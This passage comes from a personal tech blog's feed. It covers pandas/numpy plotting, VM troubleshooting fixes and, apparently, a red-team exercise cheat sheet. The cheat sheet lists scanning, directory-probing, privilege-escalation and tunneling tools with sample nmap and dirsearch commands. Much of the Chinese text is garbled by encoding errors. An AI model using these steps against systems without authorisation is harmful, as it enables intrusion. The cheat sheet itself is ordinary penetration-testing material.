class="hljs-comment"># returns pandas.core.frame.DataFrame</span><br></code></pre></td></tr></table></figure><p><strong>numpy is a python package for scientific computing</strong></p><ul><li><p>numpy has an assortment of classes and methods to help with calculations.</p></li><li><p>When you use python for data science you use a mix of pandas and numpy objects and methods</p></li></ul><p><strong>A one dimensional numpy array is similar to a pandas Series</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">airports_array = np.array([<span class="hljs-string">&#x27;Pearson&#x27;</span>, <span class="hljs-string">&#x27;Changi&#x27;</span>, <span class="hljs-string">&#x27;Narita&#x27;</span>])<br><span class="hljs-built_in">print</span>(airports_array)<br><span class="hljs-built_in">print</span>(airports_array[<span class="hljs-number">2</span>])<br><span class="hljs-comment"># returns</span><br><span class="hljs-comment"># [&#x27;Pearson&#x27; &#x27;Changi&#x27; &#x27;Narita&#x27;] </span><br><span class="hljs-comment"># Narita</span><br><br><br>airports_series = pd.Series([<span class="hljs-string">&#x27;Pearson&#x27;</span>,<span class="hljs-string">&#x27;Changi&#x27;</span>, <span class="hljs-string">&#x27;Narita&#x27;</span>])<br><span class="hljs-built_in">print</span>(airports_series)<br><span class="hljs-built_in">print</span>(airports_series[<span class="hljs-number">2</span>])<br><span class="hljs-comment"># returns </span><br><span class="hljs-comment"># 0 Pearson</span><br><span class="hljs-comment"># 1 Changi </span><br><span class="hljs-comment"># 2 Narita </span><br><span class="hljs-comment"># Narita</span><br></code></pre></td></tr></table></figure><p><strong>A two dimensional numpy array is similar to a pandas DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">airports_array = np.array([[<span class="hljs-string">&#x27;YYZ&#x27;</span>,<span class="hljs-string">&#x27;Pearson&#x27;</span>], [<span class="hljs-string">&#x27;SIN&#x27;</span>,<span class="hljs-string">&#x27;Changi&#x27;</span>], [<span class="hljs-string">&#x27;NRT&#x27;</span>,<span class="hljs-string">&#x27;Narita&#x27;</span>]])<br><span class="hljs-built_in">print</span>(airports_array)<br><span class="hljs-built_in">print</span>(airports_array[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]) <br><span class="hljs-comment"># returns</span><br><span class="hljs-comment"># [[&#x27;YYZ&#x27; &#x27;Pearson&#x27;]</span><br><span class="hljs-comment">#  [&#x27;SIN&#x27; &#x27;Changi&#x27;]</span><br><span class="hljs-comment">#  [&#x27;NRT&#x27; &#x27;Narita&#x27;]] </span><br><span class="hljs-comment"># YYZ </span><br><br><br>airports_df = pd.DataFrame([[<span class="hljs-string">&#x27;YYZ&#x27;</span>,<span class="hljs-string">&#x27;Pearson&#x27;</span>], [<span class="hljs-string">&#x27;SIN&#x27;</span>,<span class="hljs-string">&#x27;Changi&#x27;</span>], [<span class="hljs-string">&#x27;NRT&#x27;</span>,<span class="hljs-string">&#x27;Narita&#x27;</span>]])<br><span class="hljs-built_in">print</span>(airports_df)<br><span class="hljs-built_in">print</span>(airports_df.iloc[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])<br><span class="hljs-comment"># returns </span><br><span class="hljs-comment">#   0   1 </span><br><span class="hljs-comment"># 0 YYZ Pearson </span><br><span class="hljs-comment"># 1 SIN Changi </span><br><span class="hljs-comment"># 2 NRT Narita</span><br><span class="hljs-comment"># YYZ </span><br></code></pre></td></tr></table></figure><p><strong>You can move data between numpy and pandas objects</strong></p><p>If you want your predicted values in a <strong>pandas DataFrame</strong> instead of a <strong>numpy array</strong>, you can use the <strong>pandas DataFrame</strong> <strong>constructor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">y_pred_df = pd.DataFrame(y_pred)<br><br><span class="hljs-built_in">type</span>(y_pred)<br><span class="hljs-comment"># Returns numpy.ndarray</span><br><span class="hljs-built_in">type</span>(y_pred_df)<br><span class="hljs-comment"># Returns pandas.core.frame.DataFrame</span><br></code></pre></td></tr></table></figure><h3 id="8ã€Visualizing-Data-with-Matplotlib"><a href="#8ã€Visualizing-Data-with-Matplotlib" class="headerlink" title="8ã€Visualizing Data with Matplotlib"></a>8ã€Visualizing Data with Matplotlib</h3><p><strong>Checking for correlation with visualization</strong></p><ul><li><p>Scatterplots</p><ul><li><p>Common chart type</p></li><li><p>A dot is drawn for each intersection of X and Y</p></li></ul></li><li><p>Useful for checking for correlation between columns of data</p><ul><li>There is correlation when a change in one column is bound to the value of another column </li></ul></li><li><p>Examples</p><ul><li><p>A correlation exists between number of car accidents on a given day and the amount of snowfall </p></li><li><p>No correlation exists between amount of snowfall on a given day and the Microsoft stock price</p></li></ul></li></ul><p><strong>Scatterplot examples</strong></p><p><strong>Using matplotlib to draw graphs</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Import the library</span><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># Create plots directly from the DataFrame</span><br>delays_df = pd.read_csv(<span class="hljs-string">&#x27;Data/Lots_of_flight_data.csv&#x27;</span>) <br>delays_df.plot(kind=<span class="hljs-string">&#x27;scatter&#x27;</span>, x=<span class="hljs-string">&#x27;DISTANCE&#x27;</span>, y=<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>, color=<span class="hljs-string">&#x27;blue&#x27;</span>, alpha=<span class="hljs-number">0.3</span>,<br>Â  Â  Â  Â  Â  Â  Â  Â title=<span class="hljs-string">&#x27;Correlation arrival and distance&#x27;</span>)<br>plt.show()<br><br>delays_df.plot(kind=<span class="hljs-string">&#x27;scatter&#x27;</span>, x=<span class="hljs-string">&#x27;DEP_DELAY&#x27;</span>, y=<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>, color=<span class="hljs-string">&#x27;blue&#x27;</span>, alpha=<span class="hljs-number">0.3</span>,<br>               title=<span class="hljs-string">&#x27;Correlation of arrival and departure delay&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.xlabel(<span class="hljs-string">&#x27;Departure delay (minutes)&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Arrival delay (minutes)&#x27;</span>)<br>plt.title(<span class="hljs-string">&#x27;Correlation Departure and Arrival Delay&#x27;</span>)<br>plt.scatter(x=delays_df[<span class="hljs-string">&#x27;DEP_DELAY&#x27;</span>], y=delays_df[<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>], color=<span class="hljs-string">&#x27;blue&#x27;</span>, alpha=<span class="hljs-number">0.3</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><strong>You can draw a line graph to show the predicted values of a trained model</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.xlabel(<span class="hljs-string">&#x27;Departure delay (minutes)&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Arrival delay (minutes)&#x27;</span>)<br>plt.title(<span class="hljs-string">&#x27;Predicted Arrival delays&#x27;</span>)<br>plt.plot(X_test, y_pred, color=<span class="hljs-string">&#x27;red&#x27;</span>, linewidth=<span class="hljs-number">2</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><strong>Overlay the model on our data</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">plt.xlabel(<span class="hljs-string">&#x27;Deparure delay&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Arrival delay&#x27;</span>)<br>plt.plot(X_test, y_pred, color=<span class="hljs-string">&#x27;red&#x27;</span>, linewidth=<span class="hljs-number">2</span>)<br>plt.scatter(x=delays_df[<span class="hljs-string">&#x27;DEP_DELAY&#x27;</span>], y=delays_df[<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>], color=<span class="hljs-string">&#x27;blue&#x27;</span>,  alpha=<span class="hljs-number">0.3</span>)<br>plt.show()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Win7å®‰è£…VMtoolså‡ºç°æ— æ³•è‡ªåŠ¨å®‰è£…é©±åŠ¨ç¨‹åº</title>
    <link href="/2022/08/15/Tools/VM/win7%E5%AE%89%E8%A3%85VMtools%E5%A4%B1%E8%B4%A5/"/>
    <url>/2022/08/15/Tools/VM/win7%E5%AE%89%E8%A3%85VMtools%E5%A4%B1%E8%B4%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_41326328/article/details/123134855">https://blog.csdn.net/qq_41326328/article/details/123134855</a></p></blockquote><p><strong>é—®é¢˜ï¼š</strong>Win7 SP1ç³»ç»Ÿå®‰è£… VMtools å‡ºç°æ— æ³•è‡ªåŠ¨å®‰è£…é©±åŠ¨ç¨‹åºé—®é¢˜</p><p><strong>åŸå› ï¼š</strong>å¯†ç ç®—æ³•ä¸ä¸€è‡´</p><p>19 å¹´ä¹‹å‰ win7 éƒ½åœ¨ä½¿ç”¨ SHA1 ç®—æ³•ï¼Œä¹‹åç»Ÿä¸€ä½¿ç”¨ SHA2 ç®—æ³•ï¼Œç®—æ³•ä¸ä¸€è‡´ï¼Œå¯¼è‡´æ— æ³•è‡ªåŠ¨å®‰è£…ã€‚éœ€è¦ä¸‹è½½è¡¥ä¸æ¥æ”¯æŒ SHA2 ç®—æ³•ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆç½‘ä¸Šä¸€å¤§å †äººå†™æ–‡ç« è¦ä½ æ£€æŸ¥æ›´æ–°çš„åŸå› ã€‚</p><p><strong>è§£å†³æ–¹æ³•ï¼š</strong>åœ¨ <a href="http://www.winwin7.com/soft/xtbd-7001.html">http://www.winwin7.com/soft/xtbd-7001.html</a> ä¸‹è½½è¡¥ä¸åŒ…</p><p>åœ¨è™šæ‹Ÿæœºé‡Œæ‰“å¼€ä¸‹è½½ç½‘é¡µï¼Œä¸‹è½½è¡¥ä¸åŒ…åè¿›è¡Œå®‰è£…ï¼Œæ›´æ–°å¥½è¡¥ä¸åå†æ¬¡å®‰è£… VMtoolsã€‚</p><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/CurtainWei/article/details/115416423">https://blog.csdn.net/CurtainWei/article/details/115416423</a></p></blockquote><p><strong>é—®é¢˜æè¿°ï¼š</strong></p><p>åœ¨ Vmware Workstation 16 Pro ä¸­ç®€æ˜“å®‰è£… Windows 7 SP1 åï¼Œæ— æ³•å®‰è£… VMware Toolsï¼Œæç¤ºå®‰è£…ç¨‹åºæ— æ³•è‡ªåŠ¨å®‰è£… Virtual Machine Communication Interface(VMCI) é©±åŠ¨ç¨‹åºã€‚å¿…é¡»æ‰‹åŠ¨å®‰è£…æ­¤é©±åŠ¨ç¨‹åºã€‚</p><p><strong>é—®é¢˜åˆ†æï¼š</strong></p><p><a href="https://kb.vmware.com/s/article/78708">VMware Tools upgrade fails on Windows without SHA-2 code signing support (78708)</a></p><p>åŸæ¥ï¼Œå¾®è½¯æ›´æ–°äº†é©±åŠ¨ç¨‹åºçš„ç­¾åç®—æ³•ï¼Œä» 2019 å¹´åˆå¼€å§‹ï¼Œé€æ­¥å¼ƒç”¨SHA-1ï¼Œæ”¹ä¸ºSHA-2ã€‚ä¸ªäººæ¨æµ‹æ–°ç‰ˆçš„VMCIé©±åŠ¨ç”¨çš„æ˜¯SHA-2ç­¾åï¼Œè€Œwin7ä¸æ”¯æŒSHA-2ç­¾åï¼Œæ‰€ä»¥å‡ºç°äº†è¿™ä¸ªé—®é¢˜ã€‚</p><p>ä¸è¿‡ï¼Œå¯ä»¥é€šè¿‡å®‰è£…è¡¥ä¸æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p><a href="https://support.microsoft.com/zh-cn/topic/é’ˆå¯¹-windows-å’Œ-wsus-çš„-2019-sha-2-ä»£ç ç­¾åæ”¯æŒè¦æ±‚-64d1c82d-31ee-c273-3930-69a4cde8e64f">é’ˆå¯¹ Windows å’Œ WSUS çš„ 2019 SHA-2 ä»£ç ç­¾åæ”¯æŒè¦æ±‚ - Microsoft æ”¯æŒ</a></p><div class="table-container"><table><thead><tr><th>ç›®æ ‡æ—¥æœŸ</th><th>äº‹ä»¶</th><th>é€‚ç”¨äº</th></tr></thead><tbody><tr><td>2019 å¹´ 3 æœˆ 12 æ—¥</td><td>ç‹¬ç«‹å®‰å…¨æ›´æ–° <code>KB4474419</code>å’Œ <code>KB4490628</code>å‘å¸ƒï¼Œå¼•å…¥äº† SHA-2 ä»£ç ç­¾åæ”¯æŒã€‚</td><td>Windows 7 SP1, Windows Server 2008 R2 SP1</td></tr></tbody></table></div><p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p><p>å¯ä»¥ä» Microsoft Update Catalog ä¸‹è½½ KB4474419 å’Œ KB4490628 è¿™ä¸¤ä¸ªè¡¥ä¸ï¼Œç„¶åå®‰è£…åˆ° win7 è™šæ‹Ÿæœºä¸­ã€‚åœ¨æ²¡æœ‰æˆåŠŸå®‰è£… VMware Tools çš„æƒ…å†µä¸‹ï¼Œä¼ æ–‡ä»¶ä¸å¤ªæ–¹ä¾¿ï¼Œå¯ä»¥ç”¨è™šæ‹Ÿæœºé‡Œæµè§ˆå™¨è®¿é—®ä¸‹è½½é¡µé¢ï¼Œç„¶åç›´æ¥åœ¨è™šæ‹Ÿæœºé‡Œä¸‹è½½å®‰è£…ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š</p><ul><li><p>KB4474419ï¼š<a href="https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419">Microsoft Update Catalog</a></p></li><li><p>KB4490628ï¼š<a href="https://www.catalog.update.microsoft.com/search.aspx?q=4490628">Microsoft Update Catalog</a></p></li></ul><p>å®‰è£…è¡¥ä¸åï¼Œé‡å¯è™šæ‹Ÿæœºï¼Œç„¶åé‡æ–°VMware Toolså³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>VM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>Win7</tag>
      
      <tag>VMtools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWåˆ†äº«</title>
    <link href="/2022/07/15/HW/HW%E5%88%86%E4%BA%AB/"/>
    <url>/2022/07/15/HW/HW%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="HWåˆ†äº«"><a href="#HWåˆ†äº«" class="headerlink" title="HWåˆ†äº«"></a>HWåˆ†äº«</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="è¢«åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#è¢«åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="è¢«åŠ¨ä¿¡æ¯æ”¶é›†"></a>è¢«åŠ¨ä¿¡æ¯æ”¶é›†</h3><h4 id="googleã€bingã€baidu"><a href="#googleã€bingã€baidu" class="headerlink" title="googleã€bingã€baidu"></a>googleã€bingã€baidu</h4><h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><h4 id="fofaã€zoomeyeã€shodan"><a href="#fofaã€zoomeyeã€shodan" class="headerlink" title="fofaã€zoomeyeã€shodan"></a>fofaã€zoomeyeã€shodan</h4><h4 id="å­åŸŸå"><a href="#å­åŸŸå" class="headerlink" title="å­åŸŸå"></a>å­åŸŸå</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Oneforall: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shmilylty/</span>OneForAll<br>subfinder<br>Layerå­åŸŸåæŒ–æ˜æœº<br></code></pre></td></tr></table></figure><h3 id="ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#ä¸»åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"></a>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†</h3><h4 id="çœŸå®-ip"><a href="#çœŸå®-ip" class="headerlink" title="çœŸå® ip"></a>çœŸå® ip</h4><p>åˆ¤æ–­æœ‰æ—  cdnï¼šå¤šåœ° pingã€cdncheck</p><h4 id="æ‰¾çœŸå®ip"><a href="#æ‰¾çœŸå®ip" class="headerlink" title="æ‰¾çœŸå®ip"></a>æ‰¾çœŸå®ip</h4><p>fofaã€å›½å¤–å›½å†…è®¿é—®</p><h4 id="ç«¯å£å‘ç°"><a href="#ç«¯å£å‘ç°" class="headerlink" title="ç«¯å£å‘ç°"></a>ç«¯å£å‘ç°</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo nmap</span><br><span class="hljs-attribute">sudo masscan</span><br><span class="hljs-attribute">fscan</span><br></code></pre></td></tr></table></figure><h4 id="ç«¯å£æœåŠ¡è¯†åˆ«"><a href="#ç«¯å£æœåŠ¡è¯†åˆ«" class="headerlink" title="ç«¯å£æœåŠ¡è¯†åˆ«"></a>ç«¯å£æœåŠ¡è¯†åˆ«</h4><p>å¯¹æ‰«æå‡ºæ¥çš„ç«¯å£è¿›è¡Œç‰ˆæœ¬è¯†åˆ«å’Œé»˜è®¤æ’ä»¶æ‰«æ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -sC -Pn -v -<span class="hljs-literal">oN</span> file<span class="hljs-number">2</span> -p xx,xx,xx,xx ip<br></code></pre></td></tr></table></figure><h4 id="webæœåŠ¡"><a href="#webæœåŠ¡" class="headerlink" title="webæœåŠ¡"></a>webæœåŠ¡</h4><p><strong>ç›®å½•æ¢æµ‹</strong></p><p>å¯»æ‰¾æ¼æ´æœåŠ¡ä»¥åŠå¯¹ç½‘ç«™ç»“æ„å½¢æˆåˆæ­¥è®¤è¯†ï¼šåå°ç®¡ç†é¡µé¢ã€æ–‡ä»¶ä¸Šä¼ ç•Œé¢ã€robots.txtã€å¤‡ä»½æ–‡ä»¶ï¼ˆgitã€DS_Storeã€phpinfoâ€¦ï¼‰</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">dirb </span>url<br><span class="hljs-keyword">dirsearch </span>-u xxx.com -e *<br>gobuster <span class="hljs-keyword">dir </span>-wordlis pathfile --url xx.com<br>nikto -h url<br></code></pre></td></tr></table></figure><p><strong>cms è¯†åˆ«</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">linux</span>whatweb<br>æ¸¸è§ˆå™¨æ’ä»¶wappalyzer<br>cms æ‰«æå·¥å…·wpscanç­‰<br></code></pre></td></tr></table></figure><h2 id="æ‰“ç‚¹"><a href="#æ‰“ç‚¹" class="headerlink" title="æ‰“ç‚¹"></a>æ‰“ç‚¹</h2><h3 id="nday-Cve-or-poc"><a href="#nday-Cve-or-poc" class="headerlink" title="nday Cve or poc"></a>nday Cve or poc</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">AWVS</span> + xray<br>crawlergo + xray<br></code></pre></td></tr></table></figure><h3 id="å¸¸è§„-web-æ¼æ´"><a href="#å¸¸è§„-web-æ¼æ´" class="headerlink" title="å¸¸è§„ web æ¼æ´"></a>å¸¸è§„ web æ¼æ´</h3><p>SQLæ³¨å…¥ã€XSSã€CSRFã€SSRFã€ç›®å½•ç©¿è¶Šã€æ–‡ä»¶è¯»å–ã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€å‘½ä»¤æ³¨å…¥ã€RCE    </p><p>ä¸­é—´ä»¶ï¼ˆapacheã€IISã€Nginxï¼‰</p><p>æ¡†æ¶ï¼ˆfastjsonã€weblogicã€shiroï¼‰</p><p>CMSï¼ˆdedecmsã€discuzã€wordpressï¼‰</p><p>Editorï¼ˆfckeditorã€kindeditorã€ewebeditorã€Ueditorï¼‰</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>æ‰«æå†…æ ¸ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">linpeas.sh: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/carlospolop/</span>PEASS-ng<br>les.sh: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jondonas/</span>linux-exploit-suggester-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">frp: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fatedier/</span>frp<br>sshçš„socketä»£ç†<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HW</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VirtualBox Ubuntuå¼€æœºåé»‘å±</title>
    <link href="/2022/07/15/Tools/VM/VirtualBox%20Ubuntu%E5%BC%80%E6%9C%BA%E5%90%8E%E9%BB%91%E5%B1%8F/"/>
    <url>/2022/07/15/Tools/VM/VirtualBox%20Ubuntu%E5%BC%80%E6%9C%BA%E5%90%8E%E9%BB%91%E5%B1%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="VirtualBox-Ubuntuå¼€æœºåé»‘å±"><a href="#VirtualBox-Ubuntuå¼€æœºåé»‘å±" class="headerlink" title="VirtualBox Ubuntuå¼€æœºåé»‘å±"></a>VirtualBox Ubuntuå¼€æœºåé»‘å±</h2><p><strong>é—®é¢˜ï¼š</strong>è¿è¡Œ ubuntuï¼Œåœ¨è´¦æˆ·å¯†ç ç•Œé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè¾“å…¥ç”¨æˆ·åå¯†ç ç™»å½•åˆ°æ¡Œé¢åˆ™é»‘å±ã€‚</p><p><strong>å¯ä»¥å°è¯•æŒ‰ä»¥ä¸‹æ–¹æ³•è§£å†³ï¼š</strong></p><ul><li><p>åœ¨ windows ä¸‹ï¼Œä»¥ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€ cmdï¼Œè¿è¡Œ netsh winsock resetï¼ˆæœ‰æ–‡ç« è¯´è¿è¡Œè¿™æ­¥åè¦é‡å¯ï¼Œå®æµ‹æ˜¯ä¸ç”¨çš„ï¼‰</p></li><li><p>å¦‚æœè¿˜æ˜¯ä¸è¡Œï¼Œè¿›è¡Œå¦‚ä¸‹è®¾ç½®ï¼š</p><ul><li>è™šæ‹Ÿæœºèœå•æ ï¼šæ§åˆ¶ == è®¾ç½® == æ˜¾ç¤º == æ˜¾å­˜å¤§å° == 28</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>VM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>VirtualBox</tag>
      
      <tag>Ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo issue and error</title>
    <link href="/2022/07/11/MessUp/Hexo-Issue-Error/"/>
    <url>/2022/07/11/MessUp/Hexo-Issue-Error/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo-issue-and-error"><a href="#Hexo-issue-and-error" class="headerlink" title="Hexo issue and error"></a>Hexo issue and error</h1><h2 id="ä¸€ã€Issue"><a href="#ä¸€ã€Issue" class="headerlink" title="ä¸€ã€Issue"></a>ä¸€ã€Issue</h2><h3 id="1ã€gitee-å›¾ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜"><a href="#1ã€gitee-å›¾ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜" class="headerlink" title="1ã€gitee å›¾ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜"></a>1ã€gitee å›¾ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜</h3><blockquote><p><a href="https://www.cnblogs.com/selier/p/9570650.html">Hexoä½¿ç”¨ç»†èŠ‚åŠå„ç§é—®é¢˜ - Selier - åšå®¢å›­ (cnblogs.com)</a></p></blockquote><p>å‡ºç° gitee å›¾ç‰‡æœ¬åœ°æ­£å¸¸æ˜¾ç¤ºéƒ¨ç½²åå´ä¸æ˜¾ç¤ºé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœç›´æ¥è®¿é—®å›¾ç‰‡æ˜¾ç¤ºæ­£å¸¸ ã€‚</p><p><img src="/2022/07/11/MessUp/Hexo-Issue-Error/image-20230323134316335.png" alt="image-20230323134316335" style="zoom:67%;"></p><p><img src="/2022/07/11/MessUp/Hexo-Issue-Error/image-20230323134230467.png" alt="image-20230323134230467" style="zoom:67%;"></p><p><strong>è§£å†³æ–¹æ³•</strong> ï¼š403 forbiddenï¼Œè¯´æ˜äº†è¿™ä¸ªç½‘ç»œèµ„æºè¿™æ ·è·å–æ˜¯è¢«æ‹’ç»çš„ï¼Œåªéœ€è¦åœ¨å¤´éƒ¨æ·»åŠ ä¸€ä¸ª metaï¼š<code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;</code></p><p>åœ¨ .md æ–‡ä»¶ä¸­æ·»åŠ  metaï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: test<br>date: 2022-7-11<br>categories: Test<br><span class="hljs-section">tags: Test</span><br><span class="hljs-section">---</span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span> /&gt;</span></span><br><br><span class="hljs-section"># æ ‡é¢˜</span><br><span class="hljs-section">## å†…å®¹</span><br><br></code></pre></td></tr></table></figure><h3 id="2ã€æœ¬åœ°ç…§ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜"><a href="#2ã€æœ¬åœ°ç…§ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜" class="headerlink" title="2ã€æœ¬åœ°ç…§ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜"></a>2ã€æœ¬åœ°ç…§ç‰‡éƒ¨ç½²åæ— æ³•æ­£å¸¸æ˜¾ç¤ºé—®é¢˜</h3><blockquote><p><a 